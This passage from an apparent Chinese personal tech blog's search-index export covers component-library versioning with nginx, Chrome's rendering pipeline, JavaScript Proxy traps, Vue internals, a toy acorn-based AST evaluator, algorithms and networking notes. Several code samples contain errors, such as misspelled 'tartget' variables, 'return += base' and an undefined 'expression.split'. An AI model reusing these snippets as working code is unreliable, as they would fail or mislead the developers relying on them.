用了组件库，带来什么好处？就如上面所说，反之，其中一个好处就是减少迭代维护组件时的工作量，具体的说，就是当一个组件出现问题时，只需要修改一处即可。与 npm 的推广理念不谋而合，可以在项目里通过 npm 管理实现了热更新，管理组件版本等。 怎么实现组件库我们先思考，一个组件库的诞生，到底需要做些什么事情？我大概整理以下构建思路仅供参考： 组件库的模式（单包/多包） 组件入库标准 组件的开发 组件库文档及组件文档在线例子 组件发布 组件迭代维护无论是二次开发还是原生开发，以上的流程是必不可少的（可能还要加上单元测试的流程）我们在使用一些 ui 框架时，是不是有一些疑问 该 ui 框架的文档到底是怎么编写的？ 组件的示例是怎么跑起来的？ 这个组件库上的示例是否和我们从 npm 下载回来的保持一致？ 组件库有多个版本，那对某个版本到底是怎么维护的？现在我们结合构建思路以 ng-zorro-antd 为例，一一展开以上思路探讨部分问题：下面谈到的组件文档，也统称为 该 ui 框架的文档到底是怎么编写的？碰到问题的第一反应，大都是“到底是怎么回事”吧，那这个文档怎么编写呢，我先从总体说明； 首先该组件库是以单包的形式构成（单包即指，所有的组件都集成一个包，以【组件库名/具体组件名】形式引入；多包即指组件以多个 npm 包分开发布，两者优缺点就不一一说明了） 组件和文档集成在一个项目，即整个 ui 使用文档，更新日志，组件使用文档等相关文档和组件代码放在一个项目里 组件有他自己的示例 md，汇总每一个 md 组成属于该组件例子 文档使用 md 格式规范编写，再由 md 转 html 技术生成页面，可使 md 文件以 html 直观展示在浏览器（md 转 html 的技术再后面文章会仔细介绍）文档以 md 形式编写而不直接用 html 形式编写的原因，从最直接的原因看，就是在 git 代码管理仓上有直观的文档，代码放在 git 仓库，这样的话以 md 的形式是最好的方法 组件的示例是怎么跑起来的？你是否会有这样的疑问，组件在一个文档网站跑起来并且有相应代码显示，感觉到神奇，到底是怎么实现的。 首先，要以什么框架为底层，以 ng-zorro-antd 为例，底层框架当然是 angular，当 md 等生成 html 时，通过 angluar/cli 启动该文档，就可以看到整个文档效果 组件相应的例子代码 .ts，和相应的例子说明文档 .md，以及这个组件整体说明文档，组成一个组件完整文档 组件是服务于 angular，那么内部的组件包括二次开发的组件，必须按照 angular 的开发规范来，文档系统也并应该按 angular 的规范来，归根结底，文档系统底层的选择，无非就是看组件依不依赖于某个框架，当然若该组件无外部依赖，那么底层的选择可以自由发挥，可以原生开发。 组件库有多个版本，那对某个版本到底是怎么维护的？一个版本发布，常用的大致可分为三个版本 major | minor | patch，那么组件库的发布也遵循这一规则。 页面如何访问不同版本在文档页面选择不同版本达到看到不同版本的文档，我们先看看官网是怎么处理的：12 版本（左图）， 11 版本（右图）, 访问 12 版本的时候 11 版本的显示是 11.4.x,而当访问 11 版本的时候显示 11.4.2, 这是因为每个版本的页面当前的版本是最新版本，而当开发 12 版本的时候已经是 11 版本的最高版本，但是并不知道 11 版本后面会修复哪些内容，所以在 12 版本写死了 11.4.x , x 这个是会变动的 根据上面的逻辑，我们可以推测出，此 git 代码如何管理，粗略画了以下流程，从图中可以看出，组件库的版本以 tag 的版本保持一致，那么文档页面的构建也应该与 tag 保持一致，当然并不是所有版本都必须有一个不同的页面，比如现有版本8.0.0, 8.1.0, 8.2.0，那是不是有三个版本的页面？其实不然，按以大版本为主，小版本为辅的原则。也就是应该要按 major | minor 版本变动为原则，在根据实际的情况考虑构建不同版本页面 当然，这种访问不同页面的方式有很多种，我自己琢磨出其中一种，以 nginx，jekins，git 工具 1.根据不同 tag 构建到不同服务器目录，以访问不同目录达到访问不同页面 jekins 构建目录：master/v7.xtag:8.0.0/7.0.0nginx: 12345678910location / {alias xxxxx/dist/master;index index.html index.html;allow all;}location /version/7.x {alias xxxxx/dist/v7.x/;index index.html index.html;allow all;} 文档的最新访问地址 127.0.0.1:80807 版本的访问即 127.0.0.1:8080/version/7.x 组件库上的示例是否和我们从 npm 下载回来的保持一致？答案是必须要一致的，从上面谈到文档系统，是由组件库和使用文档构成，那结果从原则上必然是保持一致的。当然，不排除有人开发完之后脱离了发布组件步骤就发布了文档。这种情况应当属于团队规范范畴就不探讨了 总结在浏览了 ng-zorro-antd 的文档生成系统之后，受到了启发颇大，从整个的设计思想值得我们去借鉴。从 8 版本之后，ng-zorro-antd的团队就引入 gulp 的一个构建工具，为什么引入这个工具也是值得探讨的，后面也会陆续发表跟这篇文章相关的文章，比如《md 生成 html 技术》《gulp 的使用及与其他打包工具的区别》 [笑脸]。","link":"/2021/10/24/%E6%9E%B6%E6%9E%84/%E8%B0%88ng-zorro-antd%E7%BB%84%E4%BB%B6%E5%BA%93%E7%9A%84%E6%9E%84%E5%BB%BA%E6%80%9D%E7%BB%B4/"},{"title":"浏览器","text":"单进程浏览器早期时代的浏览器是单进程的，顾名思义。单进程浏览器是指浏览器的所有功能模块都是运行在同一个进程的，包括网络、插件、js 运行环境、渲染引擎和页面等。 单进程浏览器的架构如下图：问题显而易见： 不稳定： 网络、插件、js 运行环境、渲染引擎和页面任何一个意外的崩溃，都会导致整个浏览器崩溃 不流畅：比如页面线程包含了 js 运行环境，页面渲染，和其他的模块，意味着同一线程同一时刻只能有一个模块运行，如果 js 过大，或者进入无限循环，那么其他模块就没有机会运行，造成卡顿的感觉页面的内存泄漏也是单进程变慢的原因，运行一个复杂点的页面再关闭页面。会存在内存不能完全回收的情况，这样导致约积占用内存越高，浏览器变得越慢 不安全：前面所说，插件的模块也是存在于同一个进程，那么其他模块就有可能收到插件模块的影响，通过插件可以获取系统任意资源，当你在页面运行一个插件时，意味着这个插件能够操作你的电脑，可能释放病毒，窃取密码等 多进程浏览器现在的浏览器就是多进程浏览器，先看看现在的多进程浏览器架构，以Chrome为例，扔一张图看看: 从图中可以看出最新的Chrome浏览器： 1个浏览器主进程、1个GPU进程、1个网络进程、多个渲染进程和多个插件进程 浏览器进程：负责界面显示、子进程管理等，同时提供存储功能，localStorage、cookie、session 能力 渲染进程：核心任务将 HTML、CSS 和 JS 转换为网页，排版引擎，V8 引擎都是运行在该进程中，默认情况，一个 tab 创建一个渲染进程，同域共享同一个渲染进程，处于安全考虑，运行在沙箱模式下 GPU 进程：用于 UI 界面 GPU 绘制 网络进程：负责网络资源加载 插件进程：负责浏览器插件运行 等等 可以看出，多进程的浏览器提升了浏览器的稳定性、流畅性、以及安全性，但不可避免带来一些问题： 更高的资源占用： 这么多的进程，那么意味着浏览器会消耗更多的内存（其实现在电脑配置都这么高了，这点其实不主要） 更复杂的体系架构： 浏览器各模块之间的扩展性差等问题，导致现在架构很难适应新需求 不过有好消息，为了解决以上问题，Chrome团队使用 面向服务的架构（SOA） 思想，就是说Chrome整体架构会朝向现代操作系统所采用的 面向服务的架构（SOA），如图： Chrome 最终要把 UI、文件、设备、网络等模块重构为基础服务，类似操作系统底层服务，这一步正在逐步构建。 从输入 url 到页面展示，发生了什么？用户输入 判断关键词 如果是搜索内容，则地址栏会使用浏览器搜索引擎 如果是符合 URL 规则，则合成完整的 URL 回车之后，浏览器会给当前的页面执行一次 beforeunload，可以用来取消导航 URL 请求过程 进入资源请求过程，浏览器进程通过（IPC）把 URL 请求发送到网络进程，网络进程发起请求 检查本地是否有缓存，如果有直接返回资源给浏览器进程，如果没有，直接进入网络请求 DNS 解析，获取 IP 地址，如果是 HTTPS 还要建立 TLS 连接 利用 IP 地址建立 TCP 连接，浏览器端构建请求行、请求头，相关域 cookie 等数据加到请求头，向服务器发送请求信息 服务器根据请求信息生成响应数据，并发给网络进程，然后网络进程开始解析响应头等信息 (1) 重定向 如果网络进程在解析响应头，发现状态码是 301 或者 302，那么说明需要浏览器重定向到响应头 Location 指定的 URL，这时，请求再次从头开始 (2) 响应数据类型处理 网络进程在解析响应头时，去告诉浏览器，然后根据不同的 Content-Type 类型，来决定如何显示响应体内容。需要注意的时：如果服务器配置 Conent-Type 不正确，比如将 text/html 类型的配置成 application/octet-stream 类型，那么浏览器会曲解文件内容。一个 html 文件变成了一个下载文件，这时请求就会交给浏览器的下载管理，并不会交给渲染进程，这个时候导航流程就结束了。如果时 html 文件，那么将继续准备渲染进程 准备渲染进程 默认情况，浏览器会为每个页面分配一个渲染进程。有一些情况会复用同一个渲染进程，比如：同域（根域名）的情况。这种策略叫做 process-per-site-instance 准备好之后，等待网络进程请求的资源，准备解析文档 提交文档所谓提交文档，就是浏览器进程将网络进程接受的 HTML 数据提交给渲染进程，这个过程，浏览器进程、网络进程和渲染进程时紧密联系的 浏览器进程接收到网络进程的响应头之后，向渲染进程发起提交文档的消息 渲染进程收到提交文档的信息后，和网络进程建立传输数据的管道 等渲染进程和网络进程数据传输完成之后，渲染进程会返回确认提交的信息给浏览器进程 浏览器进程收到确认提交之后，会更新浏览器的界面状态，比如，安全状态、前进后退状态、tab 的转圈圈状态 渲染阶段构建 DOM 树样式计算样式由：选择器、属性和值组成 把 CSS 转换为浏览器理解的结构（CSS 样式来源主要有三种） 通过 link 外部引入 &lt;style&gt;标记内的文件 元素的 style 属性内联 CSS 转换样式表中的属性值，使其标准化 比如：em-&gt;px，bold-&gt;700，bule-&gt;rbg(0, 0, 255) 计算出 DOM 树每个节点的具体样式 计算过程遵循 CSS 的继承和样式层叠两个规则 继承：继承如图 fonst-size 解释： 样式层叠：它定义了如何合并来自多个源的属性值的算法 布局 创建布局树在显示之前，我们还要额外构建一个包含可见元素的布局树，由 DOM 树和 CSS 生成布局树 遍历 DOM 树中可见节点，把节点加到布局树中 不可见的会被忽略 。如 head 标签下的全部内容、display：none 的元素 布局计算计算布局树节点的坐标位置，（布局操作时，会把布局计算结果重新写回布局树中） 分层一些复杂的 3D 变换、页面滚动、或者使用 z-indexing 做 z 轴排序等，还涉及到图层，渲染引擎需要为特定的节点生成专用的图层，并生成一颗对应的图层树（LayerTree）,图层和布局树之间的关系： 不是布局树每个节点都包含一个图层，节点没有对应的图层，则从属父节点的图层。 满足下面任意条件，渲染引擎会为其创建新的图层： 拥有层叠上下文属性的元素 position 值为 absolute（绝对定位）或 relative（相对定位）且 z-index 值不为 auto 的元素 position 值为 fixed（固定定位）或 sticky（粘滞定位）的元素 需要剪裁（clip）的地方 出现滚动条，滚动条也会被提升为单独层 元素设置 overflow:auto 图层绘制 在该图中，区域 1 就是 document 的绘制列表，拖动区域 2 中的进度条可以重现列表的绘制过程。 栅格化（raster）操作绘制列表只是用来记录绘制顺序和绘制指令的列表，实际上绘制操作是由渲染引擎中的合成线程来完成的。 合成线程将图层划分为图块 合成线程会按照视口附近的图块优先生成位图，所谓栅格化，是指将图块转化为位图 渲染进程维护一个栅格化的线程池，图块栅格化在该线程池执行 栅格化使用 GPU 加速生成（GPU 栅格化或者快速栅格化），生成位图在 GPU 进程执行，生成的位图保存在 GPU 内存 涉及到跨进程操作，渲染进程-&gt;GPU进程，以下图参考： 合成和显示所有图块都被栅格化，合成线程就会生成一个绘制图块的命令——DrawQuad，提交给浏览器进程，最终将页面绘制到内存中，再将内存显示在屏幕上 总结 渲染进程将 HTML 内容转换为能够读懂的 DOM 树结构。 渲染引擎将 CSS 样式表转化为浏览器可以理解的 styleSheets，计算出 DOM 节点的样式。 创建布局树，并计算元素的布局信息。 对布局树进行分层，并生成分层树。 为每个图层生成绘制列表，并将其提交到合成线程。 合成线程将图层分成图块，并在光栅化线程池中将图块转换成位图。 合成线程发送绘制图块命令 DrawQuad 给浏览器进程。 浏览器进程根据 DrawQuad 消息生成页面，并显示到显示器上。 回流和重绘 了解浏览器的渲染机制 浏览器采用流式布局模型 浏览器会将 HTML 解析成DOM，把CSS解析成CSSOM，把CSSOM和DOM结合成一个render tree 有了render tree之后，就知道了节点样式，然后浏览器会计算节点的位置，然后再绘制再页面上 回流：当我们render tree中的一些元素的结构或者尺寸等发生改变，浏览器重新渲染部分或者全部文档的过程就做回流，导致回流的操作如下 页面首页渲染 浏览器窗口大小变化 内容变化 添加或者删除节点 激活 CSS 伪类 等等 重绘：当页面中样式的改变不影响它在文档中的位置，浏览器会将新样式赋予给元素，这个过程叫做重绘，导致重绘的操作如下 background… visibility 等等 性能影响：回流的性能消耗比重绘大 避免性能影响 CSS: 避免使用table布局 避免设置多层内联样式 JS: 避免大量频繁操作DOM 对于大量插入DOM的操作，建议使用文档片段，也就是documentFragment 结合图来看： 回流 重绘 直接合成（相对回流和重绘大大提升绘制效率）","link":"/2022/06/28/%E7%9F%A5%E8%AF%86%E7%82%B9/browser/"},{"title":"style","text":"","link":"/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/style/"},{"title":"Proxy对象","text":"Proxy 是什么？ 使用 Proxy 可以创建一个代理对象，能够实现对其他对象的代理，允许拦截并重新定义对一个对象的基本操作。 “Javascript 中一切皆对象”， 那么， 到底是什么对象呢？ 理解常规对象(ordinary object)和异质对象(exotic object)根据 ECMAScript 规范，对象可分为两种对象， 常规对象(ordinary object)和异质对象(exotic object)， 任何不属于常规对象的对象都是异质对象，那到底什么是常规对象，什么是异质对象，就要先了解对象的内部方法和内部槽。 常规对象见下表: 对于 [[Get]]， 我们很熟悉， 举个例子: 1obj.foo; 引擎内部会调用[[Get]]内部方法读取属性值。当然其他操作比如 修改， 删除都会触发相应的内部方法。 一个对象必须部署 table 1 这 11 个内部方法 除了 table 1 中的方法外，还存在两个额外的方法: [[Call]] [[Construct]]: 一个对象如果被作为函数调用时，就会自动部署 table 2 这两个方法。看这个对象是否是函数时，可以为此作为判断 了解了内部方法，那么就可以了解什么是常规对象和异质对象了， 满足以下条件的就是常规对象: 内部方法都是由table 1 和 table 2中规范实现的 那么不满足以上条件的都是异质对象。 ECMAScript 原文An ordinary object is an object that satisfies all of the following criteria:For the internal methods listed in Table 4, the object uses those defined in 10.1.If the object has a [[Call]] internal method, it uses the one defined in 10.2.1.If the object has a [[Construct]] internal method, it uses the one defined in 10.2.2.An exotic object is an object that is not an ordinary object.https://262.ecma-international.org/13.0/#ordinary-object 那么 Proxy 是常规对象还是异质对象？ 首先要查阅 ECMAScript 对 Proxy 的定义: 由此可以看出 Proxy 内部实现的方法和table 1 ，table 2中的方法一样，举个例子: 12const obj = new Proxy({foo: 1});obj.foo 同样的，引擎内部会调用部署到代理对象中的[[Get]]内部方法读取属性值，虽然会部署相同的内部方法，但是行为却是不同，也就是当创建代理对象的时候没有指定的对应拦截函数，那么就会调用原始的方法，在该例子中没有指定 get()，那么当读取时就会调用原始对象的[[Get]]方法，从[[Get]]就可以看出，Proxy是一个异质对象，因为并没有按照 table 1中的规范来 ECMAScript 原文A Proxy object is an exotic object(异质对象) whose essential internal methods are partially implemented using ECMAScript code. When a handler method is called to provide the implementation of a Proxy object internal method, the handler method is passed the proxy’s target object as a parameter. A proxy’s handler object does not necessarily have a method corresponding to every essential internal method. Invoking an internal method on the proxy results in the invocation of the corresponding internal method on the proxy’s target object if the handler object does not have a method corresponding to the internal trap.https://262.ecma-international.org/13.0/#sec-proxy-object-internal-methods-and-internal-slots 如何利用Proxy代理并拦截Object前文中我们提到 get() 去拦截对象的读取，那在读取的概念中时很广泛的，很多操作都暗藏着读取，下面列举可能读取对象属性的行为: 属性访问： obj.foo in 操作符： 'foo' in obj for…in 遍历： for ... in obj obj.foo对于普通的属性访问，我们都知道会被 get() 拦截: 1234567const obj = new Proxy({foo: 1}, { get(target, key) { // target 为原对象 return tartget[key]; }});obj.foo ‘foo’ in obj对于 in 操作符，应该如何拦截呢？还是要去查 ECMAScript 规范 对于 in 的定义: ShiftExpression in RelationalExpression 1. 让 lref 是计算 RelationalExpression 的结果。 2. 让 lval 是 GetValue(lref) 的结果。 3. 让 rref 是对 ShiftExpression 求值的结果。 4. 让 val 是 GetValue(rref) 的结果。 5. 如果 Type(rval) 不是 Object，抛出TypeError异常。 6. 返回 HasProperty(rval, ToPropertyKey(lval)) 的结果 ECMAScript 原文https://262.ecma-international.org/13.0/#sec-relational-operators 重点在第 6 步， 查看 table 3中的 HasProperty，对应的拦截函数为 has，那么我们就可以对 in 操作符进行拦截了: 12345678const obj = new Proxy({foo: 1}, { has(target, key) { // target 为原对象 const has = !!tartget[key]; return has; // true or false }});'foo' in obj for … in obj再来看看 ECMAScript 对 for ... in 的部分定义: 6. 如果iterationKind为enumerate，则 a. 如果exprValue为undefined或null 则 i. 返回补全记录{[[Type]]: break， [[Value]]: empty， [[Target]]: empty} b. 让 obj 为 ToObject (exprValue) 的结果 c. 让 iterator 为 EnumerateObjectProperties(obj) 重点看 第 6 点中的 c， EnumerateObjectProperties： 12345678910111213141516function* EnumerateObjectProperties(obj) { const visited = new Set(); for (const key of Reflect.ownKeys(obj)) { if (typeof key === &quot;symbol&quot;) continue; const desc = Reflect.getOwnPropertyDescriptor(obj, key); if (desc) { visited.add(key); if (desc.enumerable) yield key; } } const proto = Reflect.getPrototypeOf(obj); if (proto === null) return; for (const protoKey of EnumerateObjectProperties(proto)) { if (!visited.has(protoKey)) yield protoKey; }} ECMAScript 原文14.7.5.6 ForIn/OfHeadEvaluationEnumerateObjectProperties 可以看出 for ... in 内部调用了 ownKeys 这个方法，那么我们就可以对其拦截了： 12345678const obj = new Proxy({foo: 1}, { ownKeys (target) { return Reflect.ownKeys(target); // ['foo'] }});for( value in obj) {} 最后我们成功拦截了这三个行为，如果还要其他需要拦截的，最主要的还是要去翻阅 ECMAScript ，文章还提到了 Reflect，这个方法提供了访问一个对象的默认行为，详细的就不再赘叙。","link":"/2022/07/05/%E7%9F%A5%E8%AF%86%E7%82%B9/Proxy%E5%AF%B9%E8%B1%A1/"},{"title":"typescript","text":"type 和 interface 区别type 简单类型 interface 复杂类型 type 不可以重复声明 联合类型表达方式不同 type | interface extends never/unknow/any 区别声明 let a = []; // never[]let a // anyobject as unknow as number Pick/Partial/Record 高级用法import type类型保护，不会编译","link":"/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/typescript/"},{"title":"vue","text":"v-if 和 v-for 的优先级源码： compiler/codegen/index.js v-for 优先于 v-if 同时出现会先执行 v-for,浪费性能，先循环再判断是否显示（v-if） 源码中 Else if(v-for) Else if (v-if) v-for 明显优先于 v-if data 是一个函数源码： initData() diff源码：mountComponent() 源码：patchVnode() diff 发生地方，深度优先，同层比较 源码：updateChildren() vue3 特性 更快 虚拟 DOM 重写 优化 slots 的生成 静态树的提升 静态属性的提升 基于 Proxy 的响应式系统 更小：通过摇树优化核心库体积 更容易维护：Typescript + 源码模块化 更加友好 跨平台： 编译器核心和运行时核心与平台无关，使得 Vue 更容易与任何平台（Web,Android,IOS）使用 更容易使用 改进 Typescript 支持，编辑器能够提供强有力的类型检查和错误及警告 更改好的调试支持 独立的响应化模块 Compostions API Vue 性能优化方法 路由懒加载 keep-alive 使用 v-show 复用 DOM v-for 遍历避免同时使用 v-if 长列表性能优化 使用 Object.freeze() ​ defindProperty configruable = false ​ 虚拟滚动（三方库，vue-virtual-scrlloer） 事件的销毁 组件本身的事件再销毁的时候会自动销毁。 但使用定时器等。建议再 beforeDestroy 时卸载定时器，防止内存泄漏 图片的懒加载 1// 记录滚动条位置，到达时才显示 &lt;img v-lazy=&quot;src&quot; /&gt; 第三方插件按需引入 1import { Button } from &quot;element-ui&quot;; 无状态的组件标记为函数式组件 子组件分割切割有动态内容的组件，不会影响其他内容的渲染，有独立的 watcher 变量本地化在计算属性使用计算属性时，使用赋值变量，减少 computed 中 get 的逻辑运行（缓存处理等） 1234567891011121314export default { computed() { base() { return 12; }, count() { const base = this.base; // 不要频繁引用this.base let res = 0; for (let i = 0; i &lt; 1000; i++) { return += base; } } }} Virtual Dom 有哪些优势，为何要设计它DOM 引擎、JS 引擎相互独立，但又工作在一个线程，JS 代码调用 DOM API 必须挂起 JS 引擎，这意味有可能会产生阻塞。且若大量的调用 DOM API，浏览器可能引起大量重绘排版，引起更大的性能消耗 VDOM 和真实 DOM 的区别和优化： VDOM 不会立马进行排版和重绘操作 VDOM 进行频繁修改，然后一次性比较并修改真实 DOM 需要修改的部分，减少 DOM 节点排版和重绘消耗 关于 render 不为人知的秘密原生操作DOM和通过框架封装操作貌似用documentFragment或直接操作dom 性能更好，为什么要使用虚拟dom方式去操作呢？ 性能 vs 维护性 框架封装的具有描述性目标性 框架保证 不用你手动优化 关于render不为人知的秘密 render的结果为一个 Vnode 组件render互不干扰那么问题来了：依赖一当发生变化，那么所在组件渲染的render函数会重新执行，那如果组件里面嵌套组件，当父组件执行render的时候，要重新生成vnode吗，子组件的render不会执行那么也就不会生成vnode，子组件没有新的vnode，patch的时候怎么比对新旧节点？ render 的结果为一个 Vnode 组件 render 互不干扰那么问题来了：依赖一当发生变化，那么所在组件渲染的 render 函数会重新执行，那如果组件里面嵌套组件，当父组件执行 render 的时候，要重新生成 vnode 吗，子组件的 render 不会执行那么也就不会生成 vnode，子组件没有新的 vnode，patch 的时候怎么比对新旧节点？ 关于依赖收集原理Dep observer Watch 之间的关系 先定义响应数据 -&gt; 修改 get -&gt; 在 get 中利用 dep.depend computed 缓存和依赖收集原理会为每个 computed 属性增加 Watcher 并且改写 Object.definedProperty 的 set 属性,缓存： 当调用 computed 属性时，用 dirty 属性会判断 是否已经执行过，为 true 则重新计算，随后设置为 falserender 中调用属性时， watcher.eavalute() popTarget(将 computed watcher 弹出，由渲染 watcher 接管) dirty = false computed watcher.depend() computed dep.depend 渲染 watcher.addDep(收集 computed 的依赖) 依赖发生变化， update() dirty = true 重新执行 render 执行 watcher.eavalute() 关键代码： initState 123456789101112131415// computed getfunction createComputedGetter(key) { return function computedGetter() { const watcher = this._computedWatchers &amp;&amp; this._computedWatchers[key]; if (watcher) { if (watcher.dirty) { watcher.evaluate(); } if (Dep.target) { watcher.depend(); } return watcher.value; } };} Watcher 1234567891011121314151617181920212223242526evaluate () { this.value = this.get() this.dirty = false}// 执行computed属性函数get () { pushTarget(this) let value const vm = this.vm value = this.getter.call(vm, vm) popTarget() return value}depend () { let i = this.deps.length while (i--) { this.deps[i].depend() }}update () { /* istanbul ignore else */ if (this.lazy) { this.dirty = true } ....} 12345depend () { if (Dep.target) { Dep.target.addDep(this) }} 生命周期的顺序理解基于vue.js 3 响应式原理…","link":"/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/vue/"},{"title":"抽象语法树","text":"abstract syntax tree, 抽象语法树 常见结构 FunctionDeclaration 函数 id{} body{}[] ClassDeclaration 类 id{} body{}[] ClassProperty key{} value ClassMethod key body{} VariableDeclaration 变量声明 declarations{}[] kind VariableDeclarator 变量说明符 id{} init{} returnStatement argument{} ExpressionStatement 表达式 expression{} CallExpression 调用表达式 callee{} arguments[] MemberExpression 成员调用表达式 object{} property{} BinaryExpression 运算符表达式 left operator right ConditionalExpression 条件运算符表达式 test{} consequent{} alternate{} ObjectExpression 对象表达式 ArrayExpression 数组表达式 elements[] UnaryExpression 元表达式 operator argument Identifier name Literal value 应用尝试解析一个 json 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148const { Parser } = require(&quot;acorn&quot;);const fs = require(&quot;fs&quot;);/**store*/class Base { shopOptions = [];}class Handle { constructor(base) { this.base = base; } async getShopOptions(platform, shopId) { return 2; } getSkuWeight() {}}class Compile { constructor(handle) { this.handle = handle; } config = { events: { &quot;base.shopOptions&quot;: &quot;a.f.sd&quot; }, }; async execute() { const events = this.config.events; for (let [key, value] of Object.entries(events)) { this.genFile(key, key); this.genFile(key+'2', value); const [context, expression] = value.includes(&quot;.&quot;) ? expression.split(&quot;.&quot;) : [this.handle, value]; const res = this.parse(this.handle, value); if (key.indexOf(&quot;.&quot;) &gt; -1) { const [_context, option] = key.split(&quot;.&quot;); try { this.handle[_context][option] = await res; } catch (error) { console.error(`${_context}中不存在${option}`); } } else if (key.indexOf(&quot;void&quot;) &gt; -1) { await res; } } } genFile(name, expression) { fs.writeFileSync( `./${name}.json`, JSON.stringify(Parser.parse(expression), null, &quot; &quot;) ); } parse(context, expression) { const ast = Parser.parse(expression); const body = ast.body[0]; if (body.type === &quot;ExpressionStatement&quot;) { console.log('expression11111111111111111111111', expression); return this.executeExpression(context, body.expression); } else { throw new Error(`不支持${body.type}类型`); } } executeExpression(context, expression) { switch (expression.type) { case &quot;CallExpression&quot;: return this.executeCallExpression(context, expression); case &quot;MemberExpression&quot;: return this.executeMemberExpression(context, expression); case &quot;BinaryExpression&quot;: return this.executeBinaryExpression(context, expression); case &quot;ConditionalExpression&quot;: return; case &quot;ObjectExpression&quot;: return; case &quot;ArrayExpression&quot;: return; case &quot;Literal&quot;: return expression.value; case &quot;UnaryExpression&quot;: return this.executeUnaryExpression(context, expression); case &quot;Identifier&quot;: return expression.value; default: throw new Error(`不支持类型${expression.type}`); } } executeMemberExpression(context, expression) { const object = this.executeExpression(context, expression.object); console.log(object); // return `${object.name}.${expression.property.value}` } executeCallExpression(context, expression) { const callee = this.executeExpression(context, expression.callee); return context[callee.name]( ...expression.arguments.map((v) =&gt; v.value) ); } async executeBinaryExpression(context, expression) { const left = await this.executeExpression(context, expression.left); const right = await this.executeExpression(context, expression.right); switch (expression.operator) { case &quot;+&quot;: return left + right; case &quot;-&quot;: return left - right; case &quot;*&quot;: return left * right; case &quot;/&quot;: return left / right; case &quot;&gt;&quot;: return left &gt; right; case &quot;&lt;&quot;: return left &lt; right; case &quot;&gt;=&quot;: return left &gt;= right; case &quot;&lt;=&quot;: return left &lt;= right; case &quot;==&quot;: return left == right; case &quot;===&quot;: return left === right; } } async executeUnaryExpression(context, expression) { const right = await this.executeExpression(context, expression.argument); switch (expression.operator) { case &quot;!&quot;: return !right; case &quot;-&quot;: return -right; case &quot;+&quot;: return +right; } }}const base = new Base();const handle = new Handle(base);const compile = new Compile(handle);compile.execute();","link":"/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91/"},{"title":"数据结构和算法","text":"时间复杂度用大写 O 表示，定性描述算法运行的时间，有O(1),O(n),O(logN),O(n^2) 空间复杂度用大写 O 表示，算法运行过程中临时占用的内存的度量有O(1),O(n),O(logN),O(n^2) 数据结构栈特点： 有序的数据结构，先进后出 栈应用场景 十进制转二进制 函数调用栈 可以用 Array.push pop 方法模拟栈 leetcode 20.有效的括号 144.二叉树的前序遍历 val left right 队列特点：有序的数据结构，先进先出 队列场景 js 异步中的任务队列，为什么引入任务队列 leetcode 933.计算最近请求次数 链表特点： 有序的数据结构，元素存储不连续，用 next 指针连在一起 场景 原型链， 对象的__proto__相当于一个 next 指针，指向构造函数的 prototype 使用链表指针获取 JSON 节点值 和数组的区别 数组：增删非首尾元素需要移动元素 链表：增删非首尾，只需改 next 指向 leetcode 237.删除链表中的节点 - p.next = p.next.next 206.反转链表 - 反转两个节点 n-&gt;n+1 n+1 -&gt; n 2.两数相加 - 83.删除排序链表中的重复元素 集合特点： 无序且唯一的数据结构 和栈、链表、队列区别 集合不可以重复 应用场景 ES6 中的集合 Set 可求交集等 字典特点： 与集合类似，存储唯一值的键值对形式数据结构 应用场景 ES6 中的字段 Map leetcode 两数之和 树特点： 分层数据抽象模型，js 没有树，用 Object 和 Array 构建树 深度优先遍历 反问根节点 对根节点的 children 挨个深度遍历 广度优先遍历 用队列解决 创建一个队列，根节点入队 将根节点出队将 children 入队 重复队头出队，children 入队 应用场景 DOM、级联选择等 二叉树（每个节点最多只能有两个节点）递归 先序遍历 访问顺序 根-&gt;left-&gt;right 中序遍历 访问顺序 left-&gt;根-&gt;right 后序遍历 访问顺序 left-&gt;right-&gt;根 二叉树（每个节点最多只能有两个节点）非递归 先序遍历 用栈 中序遍历 用栈 后序遍历 用栈 leetcode 104.二叉树的最大深度 - 深度优先 111.二叉树的最小深度 - 广度优先 102.二叉树的层序遍历 - 广度优先 图特点： 网络结构抽象模型，由边链接的节点， js 没有图，可用 Object 和 Array 构建图，图的表示法：邻接矩阵、邻接表 应用场景 道路、航班等路径 堆特点： 特殊的完全二叉树，所有节点都大于等于（最大堆），或小于等于子（最小堆）节点 js 通常用数组表示堆 左侧子节点位置是 2 * index + 1 右侧子节点位置是 2 * index + 2 父节点位置 (index - 1 ) / 2 的熵 算法设计思想分治特点： 将问题分为多个和原问题相似的小问题，递归解决小问题，再合并 leetcode 374.猜数字大小 动态规划特点： 将问题分解为相互重叠的子问题，反复求解子问题 场景 斐波那契数列问题 leetcode 70.爬楼梯 贪心特点： 期盼通过每个阶段的局部最优选择，达到全局最优，结果不一定是最优 leetcode 455.分饼干 回溯特点： 渐进式寻找并构建问题解决方式策略，选一个可能的动作开始，如果不行回溯再选另一个可能的动作开始，直到问题解决 场景 全排列 (leetcode 46) 排序及搜索算法冒泡快速插入归并选择二分搜索","link":"/2022/05/04/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/"},{"title":"网络","text":"OSI 7 层参考模型TCP/IP 协议 应用层(HTTP/HTTPS/DNS) 传输层(TCP/UDP) internet 层(IP) 网络接口层(物理接口) TCPTransmisson Control Prorocol 连接建立 可靠性传输特点： 三次握手四次挥手 UDPUser DataGram Protocol 非连接，不可靠传输方式 效率高，速度快，适合音频和视频 DNSDomain Name System域名解析系统怎么查找域名：DNS 域名解析采用的是递归查询的方式，过程，DNS 缓存&gt;根域名服务器&gt;根域名下一级 HTTP 协议Hypertext Transfer Protocol超文本传输协议 缓存数据库缓存、服务器端缓存（nginx、CDN 缓存）、浏览器缓存浏览器缓存由包含很多内容：HTTP 缓存、indexDB、cookie、localstorage 等等 HTTP 缓存强缓存和协商缓存的区别就是，强缓存是不需要发请求到服务器的，而协商缓存是需要浏览器发送请求到服务器判断本地的缓存是否失效，若不失效则不请求服务器，反之请求服务器获取最新资源 